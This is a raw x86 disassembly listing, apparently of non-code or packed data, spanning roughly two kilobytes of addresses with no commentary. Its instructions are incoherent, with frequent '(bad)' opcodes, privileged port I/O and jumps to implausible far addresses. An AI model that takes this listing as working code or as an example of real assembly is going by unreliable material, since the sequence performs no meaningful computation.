  44445a:	leave  
  44445b:	scas   eax,DWORD PTR es:[edi]
  44445c:	inc    edx
  44445d:	jge    0x444469
  44445f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444460:	pop    esp
  444461:	jb     0x444406
  444463:	outs   dx,DWORD PTR ds:[esi]
  444464:	jnp    0x4444c1
  444466:	jae    0x444498
  444468:	inc    edx
  444469:	fist   DWORD PTR [ebx+0x13]
  44446c:	call   0x8400011f
  444471:	xchg   edi,eax
  444472:	(bad)  
  444473:	mov    ecx,0x5112d761
  444478:	(bad)  
  444479:	mov    ds,WORD PTR [edi-0x4a]
  44447c:	aas    
  44447d:	(bad)  
  44447e:	ror    DWORD PTR [eax+eiz*4-0x65],cl
  444482:	push   ecx
  444483:	ds scas eax,DWORD PTR es:[edi]
  444485:	ds icebp 
  444487:	xchg   ecx,eax
  444488:	dec    edi
  444489:	mov    eax,DWORD PTR [eax]
  44448b:	pop    esp
  44448c:	push   0x33
  44448e:	mov    esi,0x81015241
  444493:	dec    ebp
  444494:	sbb    edi,DWORD PTR [edi]
  444496:	aaa    
  444497:	mov    ch,0x43
  444499:	(bad)  
  44449b:	dec    esi
  44449c:	ret    0x30bb
  44449f:	mov    eax,0x72254308
  4444a4:	sbb    dl,BYTE PTR [ebx]
  4444a6:	pop    esp
  4444a7:	push   edi
  4444a8:	jbe    0x444439
  4444aa:	mov    edx,0xbbc7bb55
  4444af:	xchg   ebx,eax
  4444b0:	cs into 
  4444b2:	dec    edi
  4444b3:	and    esp,ebp
  4444b5:	pop    ebp
  4444b6:	xabort 0x1e
  4444b9:	mov    esi,0xebd3c976
  4444be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4444bf:	xor    dl,dh
  4444c1:	fiadd  WORD PTR [edi-0x25cfa213]
  4444c7:	mov    esp,esi
  4444c9:	ins    DWORD PTR es:[edi],dx
  4444ca:	out    0xea,al
  4444cc:	popa   
  4444cd:	jl     0x444545
  4444cf:	cmp    bh,BYTE PTR [ebp+0x5fbc8286]
  4444d5:	pinsrw mm1,WORD PTR [ebp+0x6e],0xc1
  4444da:	dec    edx
  4444db:	push   0x75
  4444dd:	sub    eax,0x20b027cb
  4444e2:	mov    BYTE PTR [ebx-0x2d],cl
  4444e5:	iret   
  4444e6:	in     eax,dx
  4444e7:	fdiv   QWORD PTR [ebx-0x58c5493e]
  4444ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4444ee:	std    
  4444ef:	jle    0x44454c
  4444f1:	jno    0x444536
  4444f3:	sahf   
  4444f4:	inc    ebp
  4444f5:	dec    esp
  4444f6:	scas   eax,DWORD PTR es:[edi]
  4444f7:	dec    edx
  4444f8:	or     eax,0xdc9aa88c
  4444fd:	les    edi,FWORD PTR [esi+eax*4+0x6c]
  444501:	jnp    0x44457b
  444503:	aas    
  444504:	jb     0x444507
  444506:	cmp    BYTE PTR es:[edi-0x5d6a74c2],dh
  44450d:	iret   
  44450e:	out    dx,eax
  44450f:	dec    eax
  444510:	outs   dx,BYTE PTR ds:[esi]
  444511:	mov    ebp,DWORD PTR [ebx]
  444513:	push   cs
  444514:	retf   
  444515:	inc    edx
  444516:	pop    edx
  444517:	call   0xc59f0b02
  44451c:	loop   0x444503
  44451e:	jl     0x44458d
  444520:	jmp    0x49e:0xb344d942
  444527:	test   eax,0xc16eb799
  44452c:	icebp  
  44452d:	jns    0x444508
  44452f:	sub    eax,0x45518dc1
  444534:	aas    
  444535:	shr    BYTE PTR [edx-0x74533542],1
  44453b:	shl    DWORD PTR [edi],1
  44453d:	mov    edx,0x3ba40659
  444542:	lods   eax,DWORD PTR ds:[esi]
  444543:	data16 sub al,0x40
  444546:	or     BYTE PTR [eax+esi*2-0x48],ah
  44454a:	jae    0x4445ad
  44454c:	rcr    BYTE PTR [edi+0x41],cl
  44454f:	xchg   ebx,eax
  444550:	cmp    cl,cl
  444552:	push   0xa
  444554:	xchg   esp,eax
  444555:	call   0x8edbc89d
  44455a:	inc    ecx
  44455b:	fist   WORD PTR [ebp+edx*1+0x1659305d]
  444562:	push   edx
  444563:	scas   al,BYTE PTR es:[edi]
  444564:	jo     0x444504
  444566:	and    al,0x3f
  444568:	enter  0x80c8,0x72
  44456c:	mov    esi,0xabe7cec
  444571:	mov    cl,0x86
  444573:	mov    esi,0xd3b1bfaa
  444578:	hlt    
  444579:	mov    ds:0x28c89614,eax
  44457e:	jecxz  0x444580
  444580:	cmp    eax,0xb756b542
  444585:	adc    eax,0x79fc4d53
  44458a:	push   0x20
  44458c:	mov    edx,0xb2405398
  444591:	jge    0x444584
  444593:	mov    BYTE PTR [edx-0x55],bl
  444596:	scas   al,BYTE PTR es:[edi]
  444597:	ret    0xeab8
  44459a:	icebp  
  44459b:	pop    esi
  44459c:	inc    ecx
  44459d:	push   eax
  44459e:	lahf   
  44459f:	and    ch,dh
  4445a1:	cmp    ebx,edi
  4445a3:	push   eax
  4445a4:	aas    
  4445a5:	add    ebp,ebx
  4445a7:	lods   al,BYTE PTR ds:[esi]
  4445a8:	mov    ds:0x9a868b05,al
  4445ad:	jge    0x4445e6
  4445af:	mov    ah,0x17
  4445b1:	fild   QWORD PTR [esi+0x33]
  4445b4:	jbe    0x4445d5
  4445b6:	sub    DWORD PTR [edx+0x29e55059],edi
  4445bc:	xor    al,bh
  4445be:	jmp    0x444571
  4445c0:	mov    bl,0x3
  4445c2:	push   ecx
  4445c3:	inc    ebx
  4445c4:	mov    ebx,0x7c3cc6f2
  4445c9:	jbe    0x4445f7
  4445cb:	dec    ebp
  4445cc:	in     eax,dx
  4445cd:	cmp    esp,esp
  4445cf:	shl    BYTE PTR [edi-0xc],cl
  4445d2:	cmp    eax,0x29cd92b9
  4445d7:	shl    ebp,cl
  4445d9:	cmp    dh,BYTE PTR [ecx-0x26]
  4445dc:	mov    BYTE PTR [eax-0x3b],dl
  4445df:	dec    edx
  4445e0:	mov    al,ds:0x2c0ea306
  4445e5:	add    al,0xa6
  4445e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4445e8:	xchg   ebx,eax
  4445e9:	push   0x47297799
  4445ee:	test   eax,0x326da1f2
  4445f3:	inc    DWORD PTR [edx+0x5]
  4445f6:	stc    
  4445f7:	fist   DWORD PTR [ecx]
  4445f9:	and    eax,0x403323fe
  4445fe:	xchg   esi,eax
  4445ff:	mov    ebx,0xf5a2c9a
  444604:	push   ss
  444605:	hlt    
  444606:	sub    DWORD PTR [ecx+eiz*1-0x4c815124],ebp
  44460d:	ja     0x444662
  44460f:	(bad)  
  444610:	and    edx,DWORD PTR [eax-0x6e54a834]
  444616:	ins    DWORD PTR es:[edi],dx
  444617:	bound  ebx,QWORD PTR [ebp-0x7f]
  44461a:	into   
  44461b:	adc    esi,DWORD PTR [ecx+0x8]
  44461e:	dec    ecx
  44461f:	push   eax
  444620:	pop    esp
  444621:	push   ss
  444622:	fs cld 
  444624:	call   0x50ad:0x8e50ba2b
  44462b:	cmp    DWORD PTR [esp+eiz*8+0x1f133483],eax
  444632:	cmp    cl,BYTE PTR [ebx]
  444634:	push   cs
  444635:	fstp   st(6)
  444637:	xchg   esi,eax
  444638:	sti    
  444639:	xor    DWORD PTR [esi-0x10],edx
  44463c:	(bad)  
  44463d:	fs (bad) 
  44463f:	push   esi
  444640:	fnsave [edx-0x1]
  444643:	jl     0x4445cb
  444645:	int3   
  444646:	dec    ebx
  444647:	add    BYTE PTR [eax-0x6e71e357],dl
  44464d:	mov    ds:0x51a6da4c,eax
  444652:	push   eax
  444653:	out    dx,eax
  444654:	dec    ebp
  444655:	fsub   QWORD PTR [eax+0x43]
  444658:	mov    edi,0x887492bf
  44465d:	adc    DWORD PTR [edi],esp
  44465f:	dec    edi
  444660:	mov    ebx,ds
  444662:	add    eax,0x4d48809d
  444667:	pushf  
  444668:	xchg   BYTE PTR [ebp+0x20a95441],bl
  44466e:	sub    bl,ch
  444670:	push   ds
  444671:	(bad)  
  444672:	js     0x444685
  444674:	popf   
  444675:	jp     0x4445fe
  444677:	shr    esp,cl
  444679:	ins    BYTE PTR es:[edi],dx
  44467a:	pop    ecx
  44467b:	jecxz  0x4446bc
  44467d:	add    ecx,DWORD PTR fs:[ebx+ecx*8+0x3508ef80]
  444685:	cmp    eax,0x8e3407fd
  44468a:	lea    ebx,[edi-0x79f4adde]
  444690:	dec    esi
  444691:	mov    DWORD PTR [edx-0x55],edx
  444694:	jmp    0x974e:0x306df992
  44469b:	lock or BYTE PTR [esi],dh
  44469e:	xor    BYTE PTR [ebx+eax*4-0x7a6b9f30],ch
  4446a5:	loope  0x444726
  4446a7:	es fs lock adc ch,0x5f
  4446ad:	scas   al,BYTE PTR es:[edi]
  4446ae:	out    0x14,al
  4446b0:	sub    esp,DWORD PTR [edi+0x221df9b]
  4446b6:	jne    0x4446b3
  4446b8:	out    0x66,eax
  4446ba:	sbb    edx,ebx
  4446bc:	out    dx,eax
  4446bd:	out    0x22,eax
  4446bf:	push   esp
  4446c0:	and    BYTE PTR [eax+ebx*1+0x288ecd93],ah
  4446c7:	dec    DWORD PTR [edx]
  4446c9:	xchg   edi,eax
  4446ca:	and    al,0x67
  4446cc:	fild   QWORD PTR [edx]
  4446ce:	scas   al,BYTE PTR es:[edi]
  4446cf:	and    DWORD PTR [esi+0x3e],edi
  4446d2:	dec    ecx
  4446d3:	stc    
  4446d4:	hlt    
  4446d5:	pusha  
  4446d6:	call   0xbab22eec
  4446db:	jne    0x4446a1
  4446dd:	push   ds
  4446de:	jno    0x4446b6
  4446e0:	mov    WORD PTR [esi+eiz*4+0x32],ds
  4446e4:	lds    edx,FWORD PTR [ebx]
  4446e6:	adc    al,bh
  4446e8:	adc    DWORD PTR [edx+eax*8],edi
  4446eb:	iret   
  4446ec:	add    ecx,DWORD PTR [eax-0x65774fe9]
  4446f2:	jmp    0xb48:0x8025e090
  4446f9:	or     edx,0x6f
  4446fc:	ror    bh,1
  4446fe:	add    edx,DWORD PTR [edx+0x14]
  444701:	lea    ebp,[eax]
  444703:	pop    ds
  444704:	mov    edx,0xc73d7794
  444709:	stc    
  44470a:	push   es
  44470b:	addr16 enter 0xf579,0x11
  444710:	aas    
  444711:	shl    ebx,0xb0
  444714:	xor    dh,BYTE PTR [ebx]
  444716:	adc    al,0x4e
  444718:	(bad)  
  44471a:	add    dl,BYTE PTR [ebx]
  44471c:	jmp    0xb679ed50
  444721:	jl     0x4446b9
  444723:	mov    cl,0x29
  444725:	or     al,BYTE PTR [ebx]
  444727:	fisubr DWORD PTR [ecx+0x79]
  44472a:	ins    BYTE PTR es:[edi],dx
  44472b:	jo     0x44470c
  44472d:	jo     0x444784
  44472f:	cdq    
  444730:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444731:	loop   0x4446e5
  444733:	lods   eax,DWORD PTR ds:[esi]
  444734:	adc    eax,edx
  444736:	jmp    0x44475b
  444738:	mov    eax,ds:0x9d240276
  44473d:	dec    ebp
  44473e:	push   edi
  44473f:	cmp    BYTE PTR [edx],0x9f
  444742:	jns    0x4446fd
  444744:	inc    ebp
  444745:	push   esi
  444746:	sbb    eax,0xa8c8f38b
  44474b:	and    DWORD PTR [eax*4+0x217df208],edx
  444752:	int3   
  444753:	adc    al,0x64
  444755:	push   esp
  444756:	and    DWORD PTR [ebx+0xea913b8],esi
  44475c:	sbb    eax,ebp
  44475e:	outs   dx,BYTE PTR ds:[esi]
  44475f:	sub    ch,al
  444761:	inc    edx
  444762:	push   ebx
  444763:	bound  edi,QWORD PTR [eax]
  444765:	call   0x5ad68d6b
  44476a:	lea    esi,[ecx-0x1b]
  44476d:	(bad)  
  44476f:	mov    dh,bl
  444771:	(bad)  
  444773:	sub    DWORD PTR [edx],esi
  444775:	cmc    
  444776:	iret   
  444777:	sub    eax,0xce78f599
  44477c:	aas    
  44477d:	mov    dh,0x8a
  44477f:	jl     0x44471c
  444781:	dec    eax
  444782:	std    
  444783:	dec    edx
  444784:	mov    bh,0xc8
  444786:	sub    DWORD PTR [ebp-0xdc29698],edx
  44478c:	or     esp,DWORD PTR [esi+esi*8-0x4d]
  444790:	push   es
  444791:	pushf  
  444792:	sub    eax,0x72c8c5cc
  444797:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444798:	shl    DWORD PTR [ebx+edx*1+0x3d],0x6c
  44479d:	xchg   ecx,eax
  44479e:	cli    
  44479f:	dec    ebp
  4447a0:	addr16 daa 
  4447a2:	test   eax,esi
  4447a4:	push   0x46bd5917
  4447a9:	lods   al,BYTE PTR ds:[esi]
  4447aa:	lock pop ebx
  4447ac:	clc    
  4447ad:	pop    ecx
  4447ae:	gs aad 0x76
  4447b1:	test   BYTE PTR [edx+0xde25112],ah
  4447b7:	lods   al,BYTE PTR ds:[esi]
  4447b8:	cmp    al,0x55
  4447ba:	call   0x1b1369c9
  4447bf:	and    eax,0x7bb2cec1
  4447c4:	out    dx,eax
  4447c5:	leave  
  4447c6:	out    0x9b,al
  4447c8:	push   es
  4447c9:	pop    esi
  4447ca:	fld    TBYTE PTR [eax-0x2da53af2]
  4447d0:	jns    0x444849
  4447d2:	jns    0x444825
  4447d4:	sub    bh,ah
  4447d6:	sbb    DWORD PTR [ecx+0x7],0x8490499c
  4447dd:	xchg   BYTE PTR [esi],bl
  4447df:	scas   eax,DWORD PTR es:[edi]
  4447e0:	cmp    eax,0xedc3a385
  4447e5:	jnp    0x44479a
  4447e7:	mov    dh,0x5c
  4447e9:	sahf   
  4447ea:	xor    BYTE PTR [edi+0x6cd38d3e],bl
  4447f0:	les    eax,FWORD PTR [eax+eiz*2-0x28]
  4447f4:	xor    al,0x32
  4447f6:	xchg   edx,ebp
  4447f8:	(bad)  
  4447f9:	xchg   esp,eax
  4447fa:	inc    ecx
  4447fb:	ins    DWORD PTR es:[edi],dx
  4447fc:	ja     0x44483c
  4447fe:	sti    
  4447ff:	test   al,0x68
  444801:	xchg   edx,eax
  444802:	pop    edx
  444803:	out    dx,al
  444804:	xlat   BYTE PTR ds:[ebx]
  444805:	pop    ds
  444806:	shl    dl,0x55
  444809:	ins    DWORD PTR es:[edi],dx
  44480a:	inc    esp
  44480b:	in     al,0xa7
  44480d:	das    
  44480e:	lea    edi,[ecx+0x180c03b6]
  444814:	dec    ebp
  444815:	or     DWORD PTR [esp+ebx*8+0x1b],ebp
  444819:	(bad)  
  44481a:	(bad)  
  44481b:	stos   DWORD PTR es:[edi],eax
  44481c:	fld    DWORD PTR [edx-0x795c6009]
  444822:	stos   BYTE PTR es:[di],al
  444824:	(bad)  
  444825:	jmp    0x8de8:0xd6b66495
  44482c:	mov    ah,0x50
  44482e:	push   ebp
  44482f:	jg     0x444821
  444831:	xchg   esi,eax
  444832:	sbb    DWORD PTR [ebx+0x6a],esp
  444835:	sub    eax,ebp
  444837:	test   BYTE PTR [edx],0x55
  44483a:	and    BYTE PTR [ebp+eiz*8-0x6a],bh
  44483e:	sub    al,0xa1
  444840:	push   cs
  444841:	cmp    ah,BYTE PTR [esi-0x3b]
  444844:	adc    BYTE PTR [ebp+0x7d],dh
  444847:	push   esi
  444848:	pop    esi
  444849:	push   esi
  44484a:	sub    dl,BYTE PTR [edx+ebp*1]
  44484d:	or     eax,0x68af02db
  444852:	or     ebp,esp
  444854:	rcr    BYTE PTR [edi-0x705d7f41],cl
  44485a:	inc    edi
  44485b:	aaa    
  44485c:	mov    esi,0xce13661b
  444861:	pop    esp
  444862:	aas    
  444863:	mov    eax,ecx
  444865:	inc    ecx
  444866:	out    0x6f,al
  444868:	mov    DWORD PTR [edi+0x4],edx
  44486b:	mov    edx,0x11d8a9c5
  444870:	sbb    dl,BYTE PTR [edi+ebx*1]
  444873:	dec    esp
  444874:	dec    esi
  444875:	popa   
  444876:	mov    DWORD PTR [esi-0x2],0x73830b72
  44487d:	ins    BYTE PTR es:[edi],dx
  44487e:	push   0x24
  444880:	mul    DWORD PTR [ecx]
  444882:	sar    esi,0x28
  444885:	push   edi
  444886:	add    DWORD PTR [esi-0x7c],esi
  444889:	fwait
  44488a:	or     DWORD PTR [edi-0x64],ebp
  44488d:	dec    esp
  44488e:	test   al,0xe
  444890:	jle    0x4448b6
  444892:	or     bh,BYTE PTR [esp+edi*8+0x73]
  444896:	in     al,dx
  444897:	or     DWORD PTR [ecx-0x7d],0x27
  44489b:	push   edi
  44489c:	xchg   esi,eax
  44489d:	lock cmp BYTE PTR [edx+0x24fc04ac],ch
  4448a4:	aas    
  4448a5:	sbb    al,ah
  4448a7:	gs fs ins BYTE PTR es:[edi],dx
  4448aa:	arpl   WORD PTR [eax-0x62],dx
  4448ad:	inc    edi
  4448ae:	pop    ecx
  4448af:	data16 fld TBYTE PTR ds:[ebx+0x190ed349]
  4448b7:	cmp    al,0x3e
  4448b9:	xchg   edx,eax
  4448bb:	inc    ebx
  4448bc:	jo     0x4448a4
  4448be:	sti    
  4448bf:	ins    BYTE PTR es:[edi],dx
  4448c0:	mov    esp,0x27e89465
  4448c5:	cmp    BYTE PTR [edi],bh
  4448c7:	jno    0x444918
  4448c9:	ins    DWORD PTR es:[edi],dx
  4448ca:	lock retf 0x853
  4448ce:	cli    
  4448cf:	xchg   DWORD PTR [edx+0x62c5a8cf],ecx
  4448d5:	aaa    
  4448d6:	enter  0xce36,0xaf
  4448da:	push   0x5f3c86a0
  4448df:	sbb    eax,0x83fed3eb
  4448e4:	pop    es
  4448e5:	in     eax,0xa4
  4448e7:	call   0x2bb734c3
  4448ec:	ror    BYTE PTR [ebp-0x73db2013],1
  4448f2:	test   al,al
  4448f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4448f5:	add    ebp,0xffffffa7
  4448f8:	jle    0x44488d
  4448fa:	mov    cl,0xf4
  4448fc:	sahf   
  4448fd:	mov    ecx,0x83b6c3a8
  444902:	dec    ecx
  444903:	loop   0x444924
  444905:	and    ecx,DWORD PTR ds:0xc30f60a5
  44490b:	push   edi
  44490c:	paddw  mm3,mm2
  44490f:	daa    
  444910:	mov    ds:0xf2a9d6d1,al
  444915:	cmp    bl,cl
  444917:	dec    edi
  444918:	add    eax,0xc9b1564b
  44491d:	ror    cl,cl
  44491f:	aam    0x37
  444921:	outs   dx,DWORD PTR ds:[esi]
  444922:	arpl   WORD PTR gs:0x5e84a2,ax
  444929:	and    ebp,ebx
  44492b:	out    0x6e,al
  44492d:	pop    eax
  44492e:	mov    edx,0x3dbcc999
  444933:	std    
  444934:	je     0x444939
  444936:	stos   BYTE PTR es:[edi],al
  444937:	mov    DWORD PTR [edi-0x166880db],esi
  44493d:	test   eax,0x3f6562a9
  444942:	out    dx,eax
  444943:	enter  0x43e7,0x9f
  444947:	in     al,dx
  444948:	mov    esp,0x3f62e107
  44494d:	sub    al,0xb3
  44494f:	inc    esi
  444950:	xchg   DWORD PTR [esp+edx*1+0x704e3f2a],esi
  444957:	jmp    0xa02b:0x6b45ba83
  44495e:	push   cs
  44495f:	push   esi
  444960:	ins    DWORD PTR es:[edi],dx
  444961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444962:	fcom   QWORD PTR [esi-0x35]
  444965:	in     eax,0xa7
  444967:	jmp    0x44491b
  444969:	dec    ebx
  44496a:	data16 jl 0x444924
  44496d:	mov    ebx,0x533edff3
  444972:	je     0x4449d9
  444974:	sub    al,0xe6
  444976:	and    al,0x75
  444978:	imul   ebp,esi,0xffffffc5
  44497b:	adc    eax,0x4b
  44497e:	cmc    
  44497f:	mov    ebp,0xfc7e2f8
  444984:	xor    dh,bh
  444986:	dec    ecx
  444987:	shl    DWORD PTR [esp+esi*2],0x6
  44498b:	icebp  
  44498c:	sub    al,0x44
  44498e:	es jo  0x444947
  444991:	or     DWORD PTR [eax],edx
  444993:	jecxz  0x44495d
  444995:	xor    cl,cl
  444997:	push   esp
  444998:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  444999:	cwde   
  44499a:	out    dx,al
  44499b:	mov    WORD PTR [ebx],ss
  44499d:	push   eax
  44499e:	mov    ch,0x67
  4449a0:	loop   0x444a1d
  4449a2:	inc    edi
  4449a3:	pop    ecx
  4449a4:	(bad)  
  4449a5:	lods   al,BYTE PTR ds:[esi]
  4449a6:	mov    al,0x58
  4449a8:	xchg   edx,eax
  4449a9:	aaa    
  4449aa:	pop    edx
  4449ab:	xor    al,0x21
  4449ad:	shl    DWORD PTR [ebx],1
  4449af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4449b0:	popf   
  4449b1:	mov    ds:0x7e5d519a,al
  4449b6:	dec    eax
  4449b7:	arpl   dx,cx
  4449b9:	mov    DWORD PTR [ebp-0x4c],ecx
  4449bc:	jns    0x444948
  4449be:	adc    al,0xaa
  4449c0:	jo     0x4449b9
  4449c2:	push   ecx
  4449c3:	popa   
  4449c4:	nop
  4449c5:	sub    edx,esi
  4449c7:	xor    DWORD PTR [ebx-0x4c1ea4d3],ebx
  4449cd:	lds    esp,FWORD PTR [esp+eax*1+0x6f]
  4449d1:	daa    
  4449d2:	addr16 mov ebp,0xe81a8f0c
  4449d8:	in     eax,0x9e
  4449da:	iret   
  4449db:	push   ss
  4449dc:	in     al,dx
  4449dd:	icebp  
  4449de:	gs add al,0xd0
  4449e1:	push   ecx
  4449e2:	(bad)  
  4449e3:	aaa    
  4449e4:	fld    DWORD PTR [ebx]
  4449e6:	into   
  4449e7:	arpl   cx,ax
  4449e9:	cmp    BYTE PTR [eax+ebx*8-0x7f803542],0x3f
  4449f1:	mov    ss,WORD PTR [eax]
  4449f3:	xor    eax,0x5a050c0a
  4449f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4449f9:	leave  
  4449fa:	in     eax,dx
  4449fb:	loope  0x4449f0
  4449fd:	jmp    0xca925c48
  444a02:	pushf  
  444a03:	into   
  444a04:	or     eax,0xbeff0385
  444a09:	repz sar BYTE PTR [edx],1
  444a0c:	pop    ds
  444a0d:	test   al,0xd6
  444a0f:	sub    al,0xe5
  444a11:	sub    BYTE PTR [esp+ecx*2],0x40
  444a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444a16:	jmp    0xa527af1c
  444a1b:	adc    eax,0xb1f6d1a4
  444a20:	mov    ch,0x1d
  444a22:	sti    
  444a23:	mov    ds:0xb5cb3e3f,al
  444a28:	and    BYTE PTR [ebp+0x7d],ch
  444a2b:	and    DWORD PTR [ebx-0x6f],edx
  444a2e:	xor    al,0x3d
  444a30:	fbstp  TBYTE PTR [esi-0x39]
  444a33:	imul   edx,DWORD PTR [ebp-0x327b6302],0x8df7c9e5
  444a3d:	js     0x444a95
  444a3f:	int    0xd8
  444a41:	and    ah,cl
  444a43:	out    0x31,al
  444a45:	ja     0x444a39
  444a47:	and    ah,BYTE PTR [ecx]
  444a49:	imul   ebp,DWORD PTR [eax+esi*1+0x4a],0xfffffff7
  444a4e:	inc    esi
  444a4f:	out    0xc,al
  444a51:	mov    edi,0x12a0e10c
  444a56:	repz into 
  444a58:	inc    edi
  444a59:	mov    dl,0x71
  444a5b:	lds    ecx,FWORD PTR [eax-0x6f1820b]
  444a61:	not    BYTE PTR [edx+ebx*2-0xd]
  444a65:	push   esp
  444a66:	or     al,0x77
  444a68:	out    dx,al
  444a69:	push   es
  444a6a:	cdq    
  444a6b:	xor    DWORD PTR [ebx+0x7ae63c00],edi
  444a71:	mov    ah,0xc7
  444a73:	adc    BYTE PTR [esi+ebp*2+0xa0b3ca9],dh
  444a7a:	test   BYTE PTR [ebp+0x77],dh
  444a7d:	xchg   edx,eax
  444a7e:	jg     0x444afd
  444a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  444a81:	lods   eax,DWORD PTR ds:[esi]
  444a82:	xchg   BYTE PTR [eax+esi*2],al
  444a85:	shr    BYTE PTR [ebp-0xa703837],1
  444a8b:	sbb    bh,0x4b
  444a8e:	test   DWORD PTR [ecx+ecx*1],ebp
  444a91:	or     DWORD PTR [ecx],ebx
  444a93:	sub    al,BYTE PTR [esi]
  444a95:	jno    0x444a1d
  444a97:	bound  ebp,QWORD PTR [edx]
  444a99:	mov    esi,0xa6dc2f40
  444a9e:	and    ecx,ecx
  444aa0:	cmp    al,0xdc
  444aa2:	inc    edx
  444aa3:	popf   
  444aa4:	dec    eax
  444aa5:	in     eax,0x12
  444aa7:	hlt    
  444aa8:	out    0x60,eax
  444aaa:	xor    BYTE PTR [eax],0xd7
  444aad:	xor    al,0x18
  444aaf:	and    al,dh
  444ab1:	inc    esp
  444ab2:	shr    BYTE PTR [ebp+0x20],1
  444ab5:	jnp    0x444a96
  444ab7:	data16 std 
  444ab9:	int    0xf1
  444abb:	mov    ah,0x2f
  444abd:	rcl    BYTE PTR [ebx],cl
  444abf:	or     al,0x28
  444ac1:	mov    dx,cx
  444ac4:	daa    
  444ac5:	in     al,0x91
  444ac7:	push   esp
  444ac8:	daa    
  444ac9:	mov    ch,0x4d
  444acb:	cmp    ebp,DWORD PTR [ecx+0x0]
  444ace:	es inc esi
  444ad0:	repnz mov eax,ds:0xb54d397c
  444ad6:	lock jne 0x444aca
  444ad9:	xchg   ebx,ebx
  444adb:	scas   eax,DWORD PTR es:[edi]
  444adc:	push   esi
  444add:	mov    ah,0xf4
  444adf:	and    al,0xde
  444ae1:	push   0xffffffc0
  444ae3:	shr    BYTE PTR [ebx+0x74cd890b],1
  444ae9:	enter  0xc8d4,0x7
  444aed:	xchg   edi,eax
  444aee:	xor    eax,0x41e97aaf
  444af3:	adc    DWORD PTR [edx+edx*8],ecx
  444af6:	adc    ecx,ebp
  444af8:	inc    eax
  444af9:	test   cl,bl
  444afb:	dec    esi
  444afc:	ja     0x444aed
  444afe:	sub    al,0xb6
  444b00:	inc    eax
  444b01:	add    BYTE PTR ds:0xa47a,cl
  444b06:	adc    ah,bh
  444b08:	icebp  
  444b09:	xchg   ebx,eax
  444b0a:	inc    ecx
  444b0b:	js     0x444b65
  444b0d:	aam    0xe4
  444b0f:	inc    esi
  444b10:	(bad)  
  444b12:	mov    eax,0xaaa80a7b
  444b17:	icebp  
  444b18:	add    DWORD PTR [ebp+0xa30358b],edi
  444b1e:	sub    esi,edx
  444b20:	mov    ah,0x2
  444b22:	push   0x1
  444b24:	cld    
  444b25:	test   DWORD PTR [ecx+0xa],ebp
  444b28:	loop   0x444b0f
  444b2a:	jae    0x444ac3
  444b2c:	jae    0x444b32
  444b2e:	xchg   esp,eax
  444b2f:	dec    ebp
  444b30:	jb     0x444abf
  444b32:	sub    ecx,DWORD PTR [ecx-0x29]
  444b35:	and    edx,esi
  444b37:	ja     0x444af5
  444b39:	neg    DWORD PTR [edi+esi*1]
  444b3c:	jo     0x444ac1
  444b3e:	inc    ebx
  444b3f:	les    esp,FWORD PTR [esi]
  444b41:	push   edi
  444b42:	adc    BYTE PTR [edx],al
  444b44:	loope  0x444b19
  444b46:	test   eax,0x8e07c4c5
  444b4b:	cmp    BYTE PTR [eax],ah
  444b4d:	inc    esi
  444b4e:	(bad)  
  444b4f:	lods   al,BYTE PTR ds:[esi]
  444b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  444b51:	sub    edi,ebp
  444b53:	imul   edx,DWORD PTR [ebp+0x3985f68],0x78
  444b5a:	pop    edx
  444b5b:	xor    DWORD PTR [edx-0x17],eax
  444b5e:	in     al,dx
  444b5f:	fnstsw WORD PTR [edi+0x242fef58]
  444b65:	aaa    
  444b66:	pop    esi
  444b67:	fsubr  DWORD PTR [ecx+0x40]
  444b6a:	xchg   DWORD PTR [ebp+0x4042a808],eax
  444b70:	pop    ss
  444b71:	push   ecx
  444b72:	mov    eax,0xbdde068a
  444b77:	sbb    BYTE PTR [edx],dh
  444b79:	loop   0x444b0a
  444b7b:	jl     0x444bf0
  444b7d:	mov    eax,0xb95eaf35
  444b82:	jo     0x444b07
  444b84:	pop    esp
  444b85:	ins    BYTE PTR es:[edi],dx
  444b86:	xor    BYTE PTR [esp+ebp*8-0x2d],bl
  444b8a:	push   ebx
  444b8b:	jb     0x444b7e
  444b8d:	(bad)  [ecx-0x23]
  444b90:	push   cs
  444b91:	mov    al,0xeb
  444b93:	cmc    
  444b94:	mov    ecx,0x2168679a
  444b99:	aaa    
  444b9a:	mov    al,ds:0x516bad83
  444b9f:	cmp    edi,DWORD PTR [eax]
  444ba1:	sub    DWORD PTR [esp+ebp*2-0x4f],edx
  444ba5:	lock add DWORD PTR [esi],0xc775cb5f
  444bac:	sub    ecx,ecx
  444bae:	xchg   ecx,eax
  444baf:	icebp  
  444bb0:	neg    ah
  444bb2:	sti    
  444bb3:	cmc    
  444bb4:	cmp    al,0x1a
  444bb6:	xor    esp,DWORD PTR [ecx+0x69627636]
  444bbc:	mov    ebp,0xb6d2d45b
  444bc1:	mov    edi,DWORD PTR [ecx+0x4dffe1ce]
  444bc7:	sbb    DWORD PTR ds:0xe952d6b7,edi
  444bcd:	nop
  444bce:	xor    DWORD PTR [eax+ecx*2-0x7cfac543],eax
  444bd5:	mov    al,0xbd
  444bd7:	mov    BYTE PTR [ebx+0x4dfed17d],dl
  444bdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  444bde:	out    0xf5,eax
  444be0:	mov    bl,0xbe
  444be2:	push   esi
  444be3:	push   edi
  444be4:	push   eax
  444be5:	lods   al,BYTE PTR ds:[esi]
  444be6:	add    BYTE PTR [esi+0x73],ch
  444be9:	mov    edx,0x7c1b9911
  444bee:	mov    dh,0x70
  444bf0:	ret    
  444bf1:	(bad)  
  444bf2:	jl     0x444c30
  444bf4:	or     ebp,ebp
  444bf6:	jl     0x444b8a
  444bf8:	xor    eax,0xc396fcb4
  444bfd:	leave  
  444bfe:	inc    eax
  444bff:	retf   0x84f1
